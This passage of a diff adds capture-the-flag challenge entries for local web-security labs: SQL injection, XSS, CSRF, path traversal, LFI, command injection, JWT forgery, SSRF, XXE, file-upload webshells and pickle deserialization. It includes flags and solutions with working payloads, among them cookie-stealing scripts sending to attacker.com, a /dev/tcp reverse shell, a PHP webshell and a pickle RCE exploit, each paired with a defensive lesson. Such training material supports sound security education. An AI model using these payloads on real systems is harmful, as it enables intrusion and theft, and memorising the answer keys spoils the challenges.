+    "description": "SQL Injection is one of the most dangerous web vulnerabilities. When user input is directly inserted into SQL queries, attackers can manipulate the query logic. This login form is vulnerable — bypass it without knowing the password!",
+    "target": "http://localhost/login",
+    "tools": ["browser", "Burp Suite"],
+    "flag": "FLAG{sq1_1nj3ct10n_byp455_l0g1n}",
+    "hints": [
+      "The login form passes your username directly into a SQL query. Try putting SQL characters in the username field.",
+      "The vulnerable query looks like: SELECT * FROM users WHERE username='INPUT' AND password='INPUT' — what happens if you make the WHERE clause always true?",
+      "In the username field, type: admin'-- (note the apostrophe and double-dash). This comments out the password check!"
+    ],
+    "solution": "Step 1: Go to http://localhost/login\n\nStep 2: In the username field, enter:\n  admin'--\n  (or: ' OR '1'='1'--)\n\nStep 3: Any password works (or leave it empty).\n\nStep 4: You're logged in as admin! Flag is shown.\n\nWhy this works:\n  Original query: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'\n  After injection: SELECT * FROM users WHERE username='admin'--' AND password='...'\n  The -- comments out everything after it, including the password check!\n\nReal-world lesson: ALWAYS use prepared statements/parameterized queries. NEVER concatenate user input into SQL strings. Use an ORM like SQLAlchemy or Hibernate.",
+    "solution_locked": true
+  },
+  {
+    "id": 25,
+    "title": "SQL Injection - Data Extraction (UNION)",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "Beyond login bypass, SQL injection can extract ALL data from a database using UNION attacks. The search feature on this site is vulnerable. Extract data from hidden tables that aren't displayed normally.",
+    "target": "http://localhost/search",
+    "tools": ["browser", "Burp Suite", "sqlmap"],
+    "flag": "FLAG{un10n_b4s3d_sqli_d4t4_dump}",
+    "hints": [
+      "The search bar passes your input to a SQL query. First, determine the number of columns: try ' ORDER BY 1-- then ' ORDER BY 2-- until you get an error.",
+      "Once you know the column count (try 3), use UNION: ' UNION SELECT 1,2,3-- to see which columns are displayed.",
+      "Extract from secret_data table: ' UNION SELECT flag,2,3 FROM secret_data-- or use sqlmap: sqlmap -u 'http://localhost/search?q=test' --dump"
+    ],
+    "solution": "Step 1: Find the injection point:\n  http://localhost/search?q=test'\n  # Error means vulnerable!\n\nStep 2: Determine column count:\n  ?q=' ORDER BY 3--   ← works\n  ?q=' ORDER BY 4--   ← error = 3 columns\n\nStep 3: Find which columns display:\n  ?q=' UNION SELECT 1,2,3--\n\nStep 4: Extract database info:\n  ?q=' UNION SELECT database(),user(),version()--\n\nStep 5: List tables:\n  ?q=' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--\n\nStep 6: Get the flag:\n  ?q=' UNION SELECT flag,2,3 FROM secret_data--\n\nAutomatic: sqlmap -u 'http://localhost/search?q=test' --dump-all",
+    "solution_locked": true
+  },
+  {
+    "id": 26,
+    "title": "Blind SQL Injection",
+    "category": "Web Security",
+    "difficulty": "Advanced",
+    "points": 250,
+    "description": "Sometimes SQL injection doesn't show results directly. 'Blind' SQLi extracts data by asking true/false questions or causing time delays. The profile lookup feature is vulnerable but doesn't display query results.",
+    "target": "http://localhost/api/user?id=1",
+    "tools": ["browser", "Burp Suite", "sqlmap"],
+    "flag": "FLAG{bl1nd_sqli_p4ti3nc3_p4y5}",
+    "hints": [
+      "Try: /api/user?id=1 AND 1=1 (returns data) vs /api/user?id=1 AND 1=2 (returns nothing). This confirms blind SQLi.",
+      "Extract the flag character by character: /api/user?id=1 AND SUBSTRING((SELECT flag FROM secret_data LIMIT 1),1,1)='F'",
+      "Use sqlmap to automate: sqlmap -u 'http://localhost/api/user?id=1' --technique=B --dump -T secret_data"
+    ],
+    "solution": "Step 1: Confirm blind SQLi:\n  /api/user?id=1 AND 1=1  → shows user data\n  /api/user?id=1 AND 1=2  → shows nothing\n\nStep 2: Boolean-based extraction:\n  /api/user?id=1 AND SUBSTRING((SELECT flag FROM secret_data),1,1)='F'\n  # If response shows data, first char is 'F'\n\nStep 3: Automate with sqlmap:\n  sqlmap -u 'http://localhost/api/user?id=1' -p id --technique=B --dump\n\nTime-based alternative:\n  /api/user?id=1 AND SLEEP(5)--   ← if response delays 5s, it's injectable!\n\nReal-world lesson: Even if you don't see data, you can still extract it via blind techniques. Modern WAFs try to prevent this, but SQLi remains OWASP #3 most critical risk.",
+    "solution_locked": true
+  },
+  {
+    "id": 27,
+    "title": "Reflected XSS",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. 'Reflected' XSS happens when your input is immediately shown back in the page without sanitization. Try it on the search page!",
+    "target": "http://localhost/search",
+    "tools": ["browser"],
+    "flag": "FLAG{r3fl3ct3d_xss_st34ls_c00k135}",
+    "hints": [
+      "Enter a simple test in the search box: <b>hello</b> — if it shows in BOLD, the site is vulnerable to HTML injection!",
+      "Now try JavaScript: <script>alert('XSS')</script> in the search box. If you see an alert popup, it's XSS!",
+      "Once XSS works, steal the cookie: <script>alert(document.cookie)</script> — The flag is in the cookie value that appears."
+    ],
+    "solution": "Step 1: Test for HTML injection:\n  Search for: <b>test</b>\n  If text appears bold, HTML is not sanitized.\n\nStep 2: Test for XSS:\n  Search for: <script>alert(1)</script>\n\nStep 3: Steal cookies (the flag is in a cookie):\n  <script>alert(document.cookie)</script>\n\nStep 4: In real attacks, send cookies to attacker:\n  <script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\nPhishing link example:\n  http://localhost/search?q=<script>alert(document.cookie)</script>\n  (Send this link to a victim to steal their session)\n\nReal-world lesson: XSS can steal sessions, redirect users to phishing sites, mine cryptocurrency, or perform actions on behalf of the victim. Always HTML-encode output and use Content-Security-Policy.",
+    "solution_locked": true
+  },
+  {
+    "id": 28,
+    "title": "Stored XSS",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "Stored XSS is MORE dangerous than reflected XSS — the malicious script is saved to the database and executes for EVERY user who views the page. The comments section saves your input without sanitization.",
+    "target": "http://localhost/comments",
+    "tools": ["browser"],
+    "flag": "FLAG{st0r3d_xss_p3rs1sts_f0r3v3r}",
+    "hints": [
+      "Post a comment to the comments section. Try: <b>hello</b> — does it appear bold? Then HTML is not sanitized.",
+      "Post this as a comment: <script>alert('Stored XSS!')</script> — if it fires when you reload the page, it's stored XSS.",
+      "Post: <script>document.title=document.cookie</script> — this changes the page title to show the cookie containing the flag."
+    ],
+    "solution": "Step 1: Go to http://localhost/comments\n\nStep 2: Post a test comment:\n  <script>alert('hacked')</script>\n\nStep 3: Reload the page — the alert fires!\n  This proves every user who views this page runs your script.\n\nStep 4: Get the flag:\n  <script>alert(document.cookie)</script>\n  (or check the page for the flag display)\n\nReal-world attack scenario:\n  <script>\n    var i = new Image;\n    i.src='http://attacker.com/steal?c='+document.cookie;\n  </script>\n  Post this and every visitor's cookie is sent to the attacker!\n\nReal-world lesson: Twitter worm (2010) spread to 500,000 users in 2 hours via stored XSS. Always use templating engines with auto-escaping and Content-Security-Policy.",
+    "solution_locked": true
+  },
+  {
+    "id": 29,
+    "title": "CSRF - Cross-Site Request Forgery",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "CSRF tricks a logged-in user into unknowingly submitting a form or making a request. If you're logged into your bank and visit a malicious site, that site can make your browser send a money transfer request on your behalf!",
+    "target": "http://localhost/profile/settings",
+    "tools": ["browser", "HTML file"],
+    "flag": "FLAG{csrf_f0rc3d_4ct10ns_w1th0ut_c0ns3nt}",
+    "hints": [
+      "Log in first, then visit the profile settings page. Notice the 'change email' form — does it have a CSRF token?",
+      "Create an HTML file on your computer with a hidden form that submits to /profile/settings/email — when you open it in your browser while logged in, it'll change the email automatically.",
+      "Create: <form action='http://localhost/profile/settings/email' method='POST'><input name='email' value='hacker@evil.com'></form><script>document.forms[0].submit()</script> — save as attack.html and open it."
+    ],
+    "solution": "Step 1: Login to the web app.\n\nStep 2: Check if /profile/settings forms have csrf_token fields.\n  (They don't! This is the vulnerability.)\n\nStep 3: Create attack.html:\n  <html><body>\n  <form action='http://localhost/profile/settings/email' method='POST'>\n    <input type='hidden' name='email' value='hacker@evil.com'>\n  </form>\n  <script>document.forms[0].submit()</script>\n  </body></html>\n\nStep 4: Open attack.html in browser while logged in.\n  Your email is changed without your knowledge!\n\nStep 5: Check the profile — email changed, flag revealed.\n\nReal-world lesson: Gmail, Facebook, and many major sites have had CSRF bugs. Protection: use CSRF tokens (random values), SameSite cookies, and check Origin/Referer headers.",
+    "solution_locked": true
+  },
+  {
+    "id": 30,
+    "title": "Path Traversal (Directory Traversal)",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 150,
+    "description": "Path traversal (aka Directory Traversal) allows attackers to access files OUTSIDE the web root by using ../ sequences to navigate up the directory tree. The file download feature is vulnerable.",
+    "target": "http://localhost/download?file=report.pdf",
+    "tools": ["browser", "curl", "Burp Suite"],
+    "flag": "FLAG{p4th_tr4v3rs4l_r34ds_4ny_f1l3}",
+    "hints": [
+      "The 'file' parameter takes a filename. What happens if you put ../ to go up a directory? Try: ?file=../../../etc/passwd",
+      "Try URL encoding: ?file=..%2F..%2F..%2Fetc%2Fpasswd — some filters can be bypassed with encoding.",
+      "The flag is at /etc/flag.txt — try: curl 'http://localhost/download?file=../../../../etc/flag.txt'"
+    ],
+    "solution": "Step 1: Test basic traversal:\n  curl 'http://localhost/download?file=../../../etc/passwd'\n\nStep 2: If filtered, try URL encoding:\n  curl 'http://localhost/download?file=..%2F..%2F..%2Fetc%2Fpasswd'\n\nStep 3: Get the flag:\n  curl 'http://localhost/download?file=../../../../etc/flag.txt'\n\nOther sensitive files to try:\n  ../../../etc/shadow      ← password hashes\n  ../../../proc/self/environ  ← environment variables\n  ../../../app/config.py   ← application config\n\nReal-world lesson: Validate that the resolved file path starts with the allowed directory. Use os.path.realpath() in Python, File.getCanonicalPath() in Java. Never trust user-supplied file paths.",
+    "solution_locked": true
+  },
+  {
+    "id": 31,
+    "title": "Local File Inclusion (LFI)",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "LFI allows attackers to make a web application include files from the server's local filesystem. This can reveal config files, source code, and with 'log poisoning', even execute commands!",
+    "target": "http://localhost/page?template=home",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{lf1_1nclud3s_s3cr3t_f1l3s}",
+    "hints": [
+      "The 'template' parameter loads files. Try: ?template=../../../etc/passwd — does it show the contents?",
+      "Try to include the application's own source: ?template=../../app/config.py or ?template=../../app/secret.txt",
+      "The flag file is at /app/secret/flag.txt — try: curl 'http://localhost/page?template=../../secret/flag'"
+    ],
+    "solution": "Step 1: Test LFI:\n  curl 'http://localhost/page?template=../../../etc/passwd'\n\nStep 2: Read application config:\n  curl 'http://localhost/page?template=../../config'\n\nStep 3: Get the flag:\n  curl 'http://localhost/page?template=../../secret/flag'\n\nLog poisoning technique:\n  1. Inject PHP code in User-Agent: curl -H 'User-Agent: <?php system($_GET[cmd]); ?>' http://localhost/\n  2. Then include the log: ?template=../../../var/log/nginx/access.log&cmd=id\n\nReal-world lesson: Never use user input to construct file paths for includes. Use a whitelist of allowed templates. PHP's include() is notorious for this vulnerability.",
+    "solution_locked": true
+  },
+  {
+    "id": 32,
+    "title": "Command Injection",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "Command injection is the most dangerous web vulnerability — it lets attackers execute arbitrary OS commands on the server. The 'network tools' page passes user input to system commands. Inject your own commands!",
+    "target": "http://localhost/tools/ping",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{cmd_1nj3ct10n_0wns_th3_s3rv3r}",
+    "hints": [
+      "The ping tool takes an IP and runs: ping -c 1 IP. Try putting a ; after the IP: 8.8.8.8; id — does 'id' execute?",
+      "If semicolon works, try: 8.8.8.8; cat /flag.txt — this should show the flag after the ping output.",
+      "Also try other separators: 8.8.8.8 && id, 8.8.8.8 | id, or `id` (backticks), or $(id)"
+    ],
+    "solution": "Step 1: Test command injection:\n  IP: 8.8.8.8; id\n  # If you see 'uid=33(www-data)' in output, it's vulnerable!\n\nStep 2: Read the flag:\n  IP: 8.8.8.8; cat /flag.txt\n\nStep 3: Get a reverse shell:\n  IP: 8.8.8.8; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n  (Listen with: nc -lvnp 4444)\n\nOther payloads:\n  127.0.0.1 | whoami\n  127.0.0.1 `id`\n  127.0.0.1 $(cat /etc/passwd)\n\nReal-world lesson: NEVER pass user input to system(), exec(), shell_exec(), subprocess, os.system() etc. Use libraries that don't invoke a shell (like subprocess.run() with a list, not a string). Always validate and whitelist input.",
+    "solution_locked": true
+  },
+  {
+    "id": 33,
+    "title": "IDOR - Insecure Direct Object Reference",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "IDOR occurs when an application uses user-controllable IDs to access objects without checking if the user is authorized. You're user #1 — can you access user #2's data? Or the admin's data?",
+    "target": "http://localhost/api/users/1",
+    "tools": ["browser", "curl", "Burp Suite"],
+    "flag": "FLAG{id0r_acc355_0th3r_us3r5_d4t4}",
+    "hints": [
+      "After logging in, notice your profile URL: /profile/1. Change the 1 to 2, 3, etc. Can you see other users' data?",
+      "Try accessing /api/users/0, /api/users/999, /api/users/admin — user ID 0 might be a special admin account.",
+      "The admin user is at /api/users/999 — access it without logging in as admin. The flag is in their profile data."
+    ],
+    "solution": "Step 1: View your own profile:\n  http://localhost/profile/1\n\nStep 2: Change the ID:\n  http://localhost/profile/2    ← other user!\n  http://localhost/profile/999  ← admin user!\n\nStep 3: Access via API:\n  curl http://localhost/api/users/999\n  (Returns admin's data including the flag)\n\nStep 4: Also try:\n  /api/orders/1  → someone else's order\n  /api/invoices/1 → someone else's invoice\n\nReal-world lesson: In 2019, a researcher found IDOR in Instagram's API that exposed anyone's phone number and email. Always check if the requesting user OWNS the resource being accessed. Use UUIDs instead of sequential IDs to make enumeration harder.",
+    "solution_locked": true
+  },
+  {
+    "id": 34,
+    "title": "Open Redirect",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Open redirect happens when an application redirects users to external URLs based on user-controlled parameters. Attackers use this for phishing — 'legit-site.com/login?next=evil.com' — the victim sees the real site's URL and trusts it.",
+    "target": "http://localhost/redirect",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{0p3n_r3d1r3ct_ph1sh1ng_v3ct0r}",
+    "hints": [
+      "The login page redirects after login: /login?next=/dashboard. What if you change 'next' to an external URL?",
+      "Try: http://localhost/redirect?url=http://evil.com — does it redirect you to evil.com?",
+      "Try: http://localhost/redirect?url=https://example.com — if you get redirected, it's vulnerable. The flag is revealed in the redirect response."
+    ],
+    "solution": "Step 1: Test the redirect parameter:\n  curl -I 'http://localhost/redirect?url=https://example.com'\n  # Check for: Location: https://example.com\n\nStep 2: Get the flag (it's in the redirect response header or destination):\n  curl -v 'http://localhost/redirect?url=https://example.com'\n\nPhishing attack example:\n  Send victim: http://localhost/redirect?url=http://fake-login.com/steal.html\n  Victim sees 'localhost' in their browser history → trusts the link!\n\nBypass attempts:\n  ?url=//evil.com  (protocol-relative)\n  ?url=http:evil.com\n  ?url=https://localhost@evil.com\n\nReal-world lesson: Validate redirect URLs against a whitelist of allowed domains. Never redirect to arbitrary user-supplied URLs.",
+    "solution_locked": true
+  },
+  {
+    "id": 35,
+    "title": "HTTP Method Tampering",
+    "category": "Web Security",
+    "difficulty": "Intermediate",
+    "points": 150,
+    "description": "Web applications often restrict access based on HTTP methods. An endpoint might reject GET requests to sensitive data but forget to protect against PUT, DELETE, or PATCH. Try unexpected HTTP methods to bypass access controls!",
+    "target": "http://localhost/api/admin/config",
+    "tools": ["curl", "Burp Suite"],
+    "flag": "FLAG{h77p_m3th0d_t4mp3r1ng_byp4ss}",
+    "hints": [
+      "Try GET: curl http://localhost/api/admin/config → '403 Forbidden'. Now try other methods!",
+      "Try: curl -X OPTIONS http://localhost/api/admin/config — see which methods are allowed.",
+      "Try: curl -X PUT http://localhost/api/admin/config -H 'Content-Type: application/json' -d '{\"debug\":true}' — this might work where GET doesn't!"
+    ],
+    "solution": "Step 1: Try GET (blocked):\n  curl http://localhost/api/admin/config\n  # 403 Forbidden\n\nStep 2: Check allowed methods:\n  curl -X OPTIONS http://localhost/api/admin/config -v\n\nStep 3: Try PUT/POST/PATCH:\n  curl -X PUT http://localhost/api/admin/config\n  # Might return 200 with config data!\n\nStep 4: Try TRACE method (can reveal headers):\n  curl -X TRACE http://localhost/\n\nStep 5: GET the flag from the config response.\n\nReal-world lesson: Apply access controls based on resources, not HTTP methods. Disable HTTP TRACE method server-wide. Avoid relying on method-based security — use proper authentication and authorization for every endpoint.",
+    "solution_locked": true
+  },
+  {
+    "id": 36,
+    "title": "JWT None Algorithm Attack",
+    "category": "Web Advanced",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "JSON Web Tokens (JWT) are used for authentication. The header specifies the algorithm used to sign the token. Some implementations accept 'none' as an algorithm — meaning NO signature verification! Change your role to admin!",
+    "target": "http://localhost:4000/api/profile",
+    "tools": ["browser", "curl", "jwt_tool", "base64"],
+    "flag": "FLAG{jwt_n0n3_4lg_byp4ss_4dm1n}",
+    "hints": [
+      "Login at /api/login (POST with {\"username\":\"user\",\"password\":\"password123\"}). You get a JWT token. Decode it at jwt.io.",
+      "The JWT has 3 parts separated by dots. Base64-decode the header and payload. Change the payload role to 'admin' and algorithm to 'none'.",
+      "New token = base64(header_none) + '.' + base64(payload_admin) + '.' (empty signature). Try it in Authorization: Bearer header."
+    ],
+    "solution": "Step 1: Get a JWT token:\n  curl -X POST http://localhost:4000/api/login \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"username\":\"user\",\"password\":\"password123\"}'\n\nStep 2: Decode the token at jwt.io or:\n  echo 'HEADER_PART' | base64 -d\n\nStep 3: Craft malicious token:\n  Header: {\"alg\":\"none\",\"typ\":\"JWT\"}\n  Payload: {\"username\":\"admin\",\"role\":\"admin\",\"iat\":...}\n  Signature: (empty)\n\nStep 4: Encode:\n  HEADER=$(echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')\n  PAYLOAD=$(echo -n '{\"username\":\"admin\",\"role\":\"admin\"}' | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')\n  TOKEN=\"$HEADER.$PAYLOAD.\"\n\nStep 5: Use the token:\n  curl -H \"Authorization: Bearer $TOKEN\" http://localhost:4000/api/admin/flag\n\nReal-world lesson: ALWAYS verify the algorithm matches what your server expects. Never accept 'none'. Use libraries that explicitly specify allowed algorithms.",
+    "solution_locked": true
+  },
+  {
+    "id": 37,
+    "title": "JWT Weak Secret (Cracking)",
+    "category": "Web Advanced",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "Even with proper algorithm verification, if the JWT secret is weak (like 'secret' or 'password123'), attackers can crack it offline and forge tokens. The API uses a weak secret — crack it and become admin!",
+    "target": "http://localhost:4000/api",
+    "tools": ["hashcat", "john", "jwt_tool"],
+    "flag": "FLAG{w34k_jwt_s3cr3t_cr4ck3d}",
+    "hints": [
+      "Get a JWT token from login. The HS256 signed token can be cracked offline with hashcat or john.",
+      "Try: hashcat -a 0 -m 16500 'YOUR_JWT_TOKEN' /usr/share/wordlists/rockyou.txt",
+      "The secret is 'secret123'. Use it to forge an admin token with jwt_tool: python3 jwt_tool.py TOKEN -T (tamper) and sign with the cracked secret."
+    ],
+    "solution": "Step 1: Get a JWT from login.\n\nStep 2: Crack with hashcat:\n  hashcat -a 0 -m 16500 YOUR_JWT_TOKEN /usr/share/wordlists/rockyou.txt\n  # Finds: secret123\n\nStep 3: Forge admin token:\n  python3 -c \"\n  import jwt, json\n  token = jwt.encode(\n    {'username': 'admin', 'role': 'admin'},\n    'secret123',\n    algorithm='HS256'\n  )\n  print(token)\n  \"\n\nStep 4: Use forged token:\n  curl -H 'Authorization: Bearer FORGED_TOKEN' http://localhost:4000/api/admin/secret\n\nReal-world lesson: Use long (256+ bit) random secrets for JWT. Consider asymmetric algorithms (RS256) where the private key never leaves your server. Rotate secrets periodically.",
+    "solution_locked": true
+  },
+  {
+    "id": 38,
+    "title": "API Key Leaked in JavaScript",
+    "category": "Web Advanced",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "Developers often accidentally include API keys, tokens, or secrets in client-side JavaScript files. These files are publicly accessible! Check the site's JavaScript source code for leaked credentials.",
+    "target": "http://localhost",
+    "tools": ["browser", "curl", "grep"],
+    "flag": "FLAG{4p1_k3y_1n_js_1s_publ1c}",
+    "hints": [
+      "Open browser DevTools (F12) → Sources tab. Browse through the JavaScript files for anything that looks like a secret.",
+      "Check /static/js/config.js — it might contain API keys or configuration with secrets.",
+      "Use the API key found in config.js to access /api/secret. The response contains the flag."
+    ],
+    "solution": "Step 1: Open DevTools (F12) → Sources → look at JS files.\n\nStep 2: Or check directly:\n  curl http://localhost/static/js/config.js\n\nStep 3: Find the API key in the JS:\n  const CONFIG = {\n    apiKey: 'sk-prod-7f3k9x2mAbCdEf123456',  ← leaked!\n    apiEndpoint: '/api/v1'\n  }\n\nStep 4: Use the key:\n  curl -H 'X-API-Key: sk-prod-7f3k9x2mAbCdEf123456' http://localhost:4000/api/secret\n\nStep 5: Flag is in the response!\n\nReal-world lesson: Never put secrets in frontend code — it's visible to everyone. Use environment variables on the server. Rotate any leaked keys immediately. Use secret scanning tools (git-secrets, truffleHog) in CI/CD pipelines.",
+    "solution_locked": true
+  },
+  {
+    "id": 39,
+    "title": "SSRF - Server-Side Request Forgery",
+    "category": "Web Advanced",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "SSRF makes the server fetch a URL that YOU specify. This can reach internal services not accessible from outside — like metadata APIs in cloud environments, or internal databases. There's an internal service running that you can't reach directly!",
+    "target": "http://localhost/api/fetch",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{55rf_4ll0w5_1nt3rn4l_4cc355}",
+    "hints": [
+      "The /api/fetch endpoint takes a URL parameter and fetches it server-side. Try: ?url=http://localhost/robots.txt",
+      "Now try internal IPs: ?url=http://172.20.0.50:9999/secret — this might reach services not accessible from outside.",
+      "Fetch the internal flag service: curl 'http://localhost/api/fetch?url=http://internal-flag:9999/flag' or use the internal IP."
+    ],
+    "solution": "Step 1: Test SSRF:\n  curl 'http://localhost/api/fetch?url=http://localhost/robots.txt'\n  # Server fetches robots.txt and returns it to you\n\nStep 2: Probe internal network:\n  curl 'http://localhost/api/fetch?url=http://172.20.0.50:9999/'\n\nStep 3: Get the internal flag:\n  curl 'http://localhost/api/fetch?url=http://internal-flag:9999/flag'\n  # Returns: {\"flag\": \"FLAG{55rf_4ll0w5_1nt3rn4l_4cc355}\"}\n\nCloud SSRF targets:\n  ?url=http://169.254.169.254/latest/meta-data/  ← AWS metadata!\n  ?url=http://metadata.google.internal/  ← GCP metadata!\n\nReal-world lesson: In 2019, Capital One was hacked via SSRF against AWS metadata endpoint. The attacker got IAM credentials and accessed 100M+ customer records. Validate/whitelist allowed URLs and block requests to internal/metadata IPs.",
+    "solution_locked": true
+  },
+  {
+    "id": 40,
+    "title": "XXE - XML External Entity Injection",
+    "category": "Web Advanced",
+    "difficulty": "Advanced",
+    "points": 250,
+    "description": "XXE happens when an XML parser processes external entity declarations. An attacker can use this to read local files, perform SSRF, or even trigger denial of service. The XML upload endpoint is vulnerable!",
+    "target": "http://localhost/api/xml",
+    "tools": ["curl", "Burp Suite"],
+    "flag": "FLAG{xxe_r34d5_l0c4l_f1l35}",
+    "hints": [
+      "Send an XML POST request to /api/xml. Try including an external entity that points to a local file.",
+      "XXE payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo> — send this as the XML body.",
+      "For the flag: replace /etc/passwd with /etc/flag.txt in the XXE payload. The server will return the file contents."
+    ],
+    "solution": "Step 1: Test XXE with /etc/passwd:\n  curl -X POST http://localhost/api/xml \\\n    -H 'Content-Type: application/xml' \\\n    -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data><name>&xxe;</name></data>'\n\nStep 2: Read the flag file:\n  curl -X POST http://localhost/api/xml \\\n    -H 'Content-Type: application/xml' \\\n    -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/flag.txt\">]><data><name>&xxe;</name></data>'\n\nStep 3: SSRF via XXE:\n  <!ENTITY xxe SYSTEM 'http://internal-flag:9999/flag'>\n\nReal-world lesson: Disable external entity processing in your XML parser. In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). In Python: use defusedxml library. NEVER parse XML from untrusted sources with default settings.",
+    "solution_locked": true
+  },
+  {
+    "id": 41,
+    "title": "File Upload Remote Code Execution",
+    "category": "Web Advanced",
+    "difficulty": "Intermediate",
+    "points": 250,
+    "description": "File upload features can be weaponized. If you can upload a PHP file to the server and then access it via the browser, you have full command execution on the server! The upload feature only checks the filename extension — can you bypass it?",
+    "target": "http://localhost/tools/upload",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{f1l3_upl04d_rce_g4m3_0v3r}",
+    "hints": [
+      "Upload a normal image file. Notice the URL of the uploaded file. Now try to upload a .php file instead of .jpg.",
+      "If .php is blocked, try: shell.php.jpg, shell.PHP, shell.phtml, shell.php5, or change Content-Type to image/jpeg while keeping .php extension.",
+      "Upload this as shell.php: <?php system($_GET['cmd']); ?> — then access /uploads/shell.php?cmd=cat+/flag.txt"
+    ],
+    "solution": "Step 1: Test file upload at /tools/upload.\n\nStep 2: Create a PHP webshell:\n  echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n\nStep 3: Upload it (try bypasses if needed):\n  # Direct upload:\n  curl -F 'file=@shell.php;type=image/jpeg' http://localhost/tools/upload\n  \n  # If filtered, try:\n  mv shell.php shell.php.jpg\n  # Or change Content-Type in Burp Suite\n\nStep 4: Access your shell:\n  curl 'http://localhost/uploads/shell.php?cmd=id'\n  curl 'http://localhost/uploads/shell.php?cmd=cat+/flag.txt'\n\nReal-world lesson: Validate file type by CONTENT (magic bytes), not extension or Content-Type header. Store uploads outside web root. Use random filenames. Scan with antivirus. Use CDN/separate domain for user uploads.",
+    "solution_locked": true
+  },
+  {
+    "id": 42,
+    "title": "GraphQL Introspection Enabled",
+    "category": "Web Advanced",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "GraphQL has a built-in feature called 'introspection' that reveals the ENTIRE schema — all types, queries, mutations, and fields. In production, this should be disabled. Use it to discover hidden admin queries and secret fields.",
+    "target": "http://localhost:4000/graphql",
+    "tools": ["browser", "curl", "GraphQL Playground"],
+    "flag": "FLAG{gr4phql_1ntr0sp3ct10n_l34ks}",
+    "hints": [
+      "Send a GraphQL introspection query to discover all available queries and types.",
+      "Try: curl -X POST http://localhost:4000/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
+      "After finding the schema, look for a 'secretFlag' or 'adminData' query. Then query it directly to get the flag."
+    ],
+    "solution": "Step 1: Run introspection:\n  curl -X POST http://localhost:4000/graphql \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"query\":\"{__schema{queryType{fields{name description}}}}\" }'\n\nStep 2: Find hidden queries in the schema.\n\nStep 3: Query the secret:\n  curl -X POST http://localhost:4000/graphql \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"query\":\"{secretFlag{flag message}}\"}'\n\nStep 4: Get the flag from the response.\n\nReal-world lesson: Disable GraphQL introspection in production. Use field-level authorization. Rate limit GraphQL queries to prevent nested query DoS attacks. Use tools like graphql-armor for production hardening.",
+    "solution_locked": true
+  },
+  {
+    "id": 43,
+    "title": "Insecure Deserialization",
+    "category": "Web Advanced",
+    "difficulty": "Advanced",
+    "points": 300,
+    "description": "Serialization converts objects to data for storage/transfer. Deserialization reverses it. If the application deserializes UNTRUSTED data, attackers can craft malicious objects that execute code when deserialized. The /api/deserialize endpoint uses Python pickle!",
+    "target": "http://localhost/api/deserialize",
+    "tools": ["curl", "python3"],
+    "flag": "FLAG{d3s3r14l1z4t10n_rce_pwn3d}",
+    "hints": [
+      "The endpoint accepts a base64-encoded pickle object. Python's pickle.loads() on untrusted data is extremely dangerous.",
+      "Create a malicious pickle payload that runs a system command when deserialized.",
+      "Python code: import pickle,base64,os; class Exploit(object):\\n  def __reduce__(self): return (os.system, ('cp /flag.txt /tmp/out.txt',))\\npayload=base64.b64encode(pickle.dumps(Exploit())).decode()"
+    ],
+    "solution": "Step 1: Create malicious pickle payload (Python):\n  import pickle, base64, os\n  \n  class Exploit(object):\n    def __reduce__(self):\n      return (os.system, ('cat /flag.txt > /tmp/flag_output.txt',))\n  \n  payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n  print(payload)\n\nStep 2: Send it to the endpoint:\n  curl -X POST http://localhost/api/deserialize \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"data\\\": \\\"$PAYLOAD\\\"}\"\n\nStep 3: The flag is returned in the response or at /tmp/flag_output.txt.\n\nReal-world lesson: NEVER deserialize untrusted data with pickle, Java ObjectInputStream, PHP unserialize(), etc. Use safe formats like JSON, MessagePack. If you must deserialize, use cryptographic signing to verify integrity.",
+    "solution_locked": true
+  },
+  {
+    "id": 44,
+    "title": "Clickjacking Attack",
+    "category": "Web Advanced",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Clickjacking overlays an invisible iframe over a page you're viewing. When you click what appears to be a button on the attacker's page, you're actually clicking on the legitimate site behind it. The InnovateTech site has no X-Frame-Options protection!",
+    "target": "http://localhost",
+    "tools": ["browser", "HTML file"],
